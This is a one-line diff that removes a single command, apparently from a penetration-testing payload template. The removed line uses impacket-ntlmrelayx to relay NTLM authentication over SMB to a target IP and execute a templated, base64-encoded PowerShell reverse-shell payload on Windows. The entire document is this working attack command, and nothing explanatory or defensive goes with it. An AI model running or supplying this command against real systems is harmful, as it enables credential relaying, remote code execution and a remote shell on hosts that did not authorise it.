@@ -1,1 +1,0 @@
-impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c "<%=${payload:-$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)}%>"
